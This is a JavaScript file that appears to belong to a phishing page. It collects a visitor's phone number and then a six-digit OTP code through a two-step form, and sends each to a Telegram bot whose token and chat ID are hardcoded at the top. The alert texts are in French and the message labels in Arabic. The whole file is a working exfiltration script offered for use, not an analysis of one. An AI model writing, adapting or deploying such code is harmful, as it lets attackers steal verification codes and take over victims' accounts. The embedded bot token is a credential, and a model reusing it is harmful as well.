const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
const chatId = "1705240737";

const phoneInput = document.querySelector("#phone");
const iti = window.intlTelInput(phoneInput, {
    initialCountry: "auto",
    geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)),
    utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
});

function processData(type) {
    let textMsg = "";
    if(type === 'phone') {
        const num = iti.getNumber();
        if(!num) return alert("Numéro invalide");
        textMsg = "📱 رقم جديد: " + num;
        document.getElementById('page1').classList.add('hidden');
        document.getElementById('page2').classList.remove('hidden');
    } else {
        let otpCode = "";
        document.querySelectorAll('.otp-field').forEach(f => otpCode += f.value);
        if(otpCode.length < 6) return alert("Code incomplet");
        textMsg = "🔑 كود OTP: " + otpCode;
    }

    sendToTelegram(textMsg);
}

function sendToTelegram(textMsg) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: chatId, text: textMsg })
    }).catch(error => console.error('Error:', error));
}

function moveFocus(el, i) {
    if(el.value.length >= 1) {
        el.value = el.value.slice(0,1);
        const fields = document.querySelectorAll('.otp-field');
        if (i < 5) fields[i+1].focus();
    }
}
